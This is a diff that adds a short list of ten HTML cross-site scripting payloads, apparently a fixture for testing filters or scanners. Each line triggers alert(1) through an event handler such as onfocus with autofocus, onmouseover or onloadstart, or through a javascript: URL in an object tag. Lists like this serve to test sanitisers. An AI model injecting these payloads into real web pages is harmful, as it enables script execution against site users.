@@ -1,0 +1,10 @@
+<div onmouseover="alert(1)">hover me</div>
+<div onmouseenter="alert(1)">hover me</div>
+<a href="#" onclick="alert(1)">click</a>
+<input onblur=alert(1) autofocus><input autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<audio src onloadstart=alert(1)>
+<form onsubmit=alert(1)><input type=submit>
+<object data="javascript:alert(1)">
